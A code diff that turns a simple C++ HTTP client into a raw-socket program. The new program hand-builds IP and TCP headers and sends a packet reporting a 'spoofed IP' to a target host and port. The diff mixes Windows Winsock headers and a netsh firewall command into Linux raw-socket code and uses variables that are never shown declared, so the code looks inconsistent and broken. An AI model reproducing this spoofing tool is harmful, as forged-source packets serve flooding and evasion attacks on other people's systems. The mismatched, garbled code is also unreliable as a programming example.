@@ -8,6 +8,9 @@
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 
+#include <winsock2.h>
+#include <ws2tcpip.h>
+
 using namespace std;
 
 // TCP packet structure
@@ -96,51 +99,45 @@ int main(int argc, char* argv[]) {
     tcp_hdr.window_size = htons(512);
     tcp_hdr.checksum = 0;
     tcp_hdr.urg_ptr = 0;
-  
-    // Construct packet
-char packet[4096];
-memset(packet, 0, sizeof(packet));
-strcpy(packet, "GET /");
-strcat(packet, page);
-strcat(packet, " HTTP/1.1\r\nHost: ");
-strcat(packet, hostname);
-strcat(packet, "\r\nConnection: keep-alive\r\n\r\n");
+      // Construct packet
+    char packet[65535];
+    memset(packet, 0, 65535);
+    memcpy(packet, &ip_hdr, sizeof(struct ipheader));
+    memcpy(packet + sizeof(struct ipheader), &tcp_hdr, sizeof(struct tcpheader));
+    
+    // Calculate TCP checksum
+    tcp_hdr.checksum = csum((unsigned short*)(packet + sizeof(struct ipheader)), sizeof(struct tcpheader)/2);
+    memcpy(packet + sizeof(struct ipheader), &tcp_hdr, sizeof(struct tcpheader));
+    
+    // Calculate IP checksum
+    ip_hdr.checksum = csum((unsigned short*)packet, sizeof(struct ipheader)/2);
+    memcpy(packet, &ip_hdr, sizeof(struct ipheader));
 
-// Open a socket connection to the server
-SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
-if (sock == INVALID_SOCKET) {
-    // Error handling
-    return 1;
-}
+    // Set socket options
+    const int on = 1;
+    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
+        perror("setsockopt() error");
+        return 1;
+    }
 
-// Connect to the server
-sockaddr_in target;
-target.sin_family = AF_INET;
-target.sin_port = htons(port);
-target.sin_addr.s_addr = inet_addr(ip);
-
-if (connect(sock, (sockaddr*)&target, sizeof(target)) == SOCKET_ERROR) {
-    // Error handling
-    return 1;
-}
-
-// Send the packet to the server
-send(sock, packet, strlen(packet), 0);
-
-// Start receiving data from the server
-char buffer[1024];
-int received = 0;
-do {
-    received = recv(sock, buffer, sizeof(buffer), 0);
-    // Process the received data
-} while (received > 0);
-
- // Close the socket connection
-    closesocket(sock);
-
-    // Cleanup Winsock
-    WSACleanup();
-
+    // Set destination address and port
+    struct sockaddr_in dest_addr;
+    dest_addr.sin_family = AF_INET;
+    dest_addr.sin_addr.s_addr = inet_addr(target_ip);
+    dest_addr.sin_port = htons(target_port);
+    
+    // Send packet
+    if (sendto(sockfd, packet, ip_hdr.total_len, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
+        perror("sendto() error");
+        return 1;
+    }
+    
+    // Print success message
+    cout << "Sent packet with spoofed IP " << inet_ntoa(*(in_addr*)&ip_hdr.src_addr) 
+         << " and source port " << ntohs(tcp_hdr.src_port) << " to " << target_ip << ":" << target_port << "\n";
+    
+    // Cleanup
+    close(sockfd);
+    system("netsh firewall set opmode enable");
     return 0;
 }
-
